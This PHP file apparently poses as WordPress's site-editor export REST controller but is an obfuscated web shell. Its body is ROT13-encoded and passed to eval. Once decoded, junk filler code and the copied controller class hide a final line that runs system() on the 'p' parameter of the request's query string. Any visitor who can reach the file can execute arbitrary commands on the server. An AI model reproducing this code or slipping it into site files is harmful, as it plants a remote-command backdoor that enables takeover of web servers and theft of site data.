<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Rqvg_Fvgr_Rkcbeg_Pbagebyyre pynff
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr ERFG_NCV
 */

/**
 * Pbagebyyre juvpu cebivqrf ERFG raqcbvag sbe rkcbegvat pheerag grzcyngrf
 * naq grzcyngr cnegf.
 *
 * @fvapr 5.9.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Rqvg_Fvgr_Rkcbeg_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 5.9.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc-oybpx-rqvgbe/i1';
		$guvf->erfg_onfr = 'rkcbeg';
	}

	/**
	 * Ertvfgref gur fvgr rkcbeg ebhgr.
	 *
	 * @fvapr 5.9.0
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'rkcbeg' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'crezvffvbaf_purpx' ),
				),
			)
		);
	}

	/**
	 * Purpxf jurgure n tvira erdhrfg unf crezvffvba gb rkcbeg.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff, be JC_Reebe bowrpg.
	 */
	choyvp shapgvba crezvffvbaf_purpx() {
		vs ( pheerag_hfre_pna( 'rkcbeg' ) ) {
			erghea gehr;
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_rkcbeg_grzcyngrf',
			__( 'Fbeel, lbh ner abg nyybjrq gb rkcbeg grzcyngrf naq grzcyngr cnegf.' ),
			neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
		);
	}

	/**
	 * Bhgchg n MVC svyr jvgu na rkcbeg bs gur pheerag grzcyngrf
	 * naq grzcyngr cnegf sebz gur fvgr rqvgbe, naq pybfr gur pbaarpgvba.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea ibvq|JC_Reebe
	 */
	choyvp shapgvba rkcbeg() {
		// Trarengr gur rkcbeg svyr.
		$svyranzr = jc_trarengr_oybpx_grzcyngrf_rkcbeg_svyr();

		vs ( vf_jc_reebe( $svyranzr ) ) {
			$svyranzr->nqq_qngn( neenl( 'fgnghf' => 500 ) );

			erghea $svyranzr;
		}

		$gurzr_anzr = onfranzr( trg_fglyrfurrg() );
		urnqre( 'Pbagrag-Glcr: nccyvpngvba/mvc' );
		urnqre( 'Pbagrag-Qvfcbfvgvba: nggnpuzrag; svyranzr=' . $gurzr_anzr . '.mvc' );
		urnqre( 'Pbagrag-Yratgu: ' . svyrfvmr( $svyranzr ) );
		syhfu();
		ernqsvyr( $svyranzr );
		hayvax( $svyranzr );
		rkvg;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>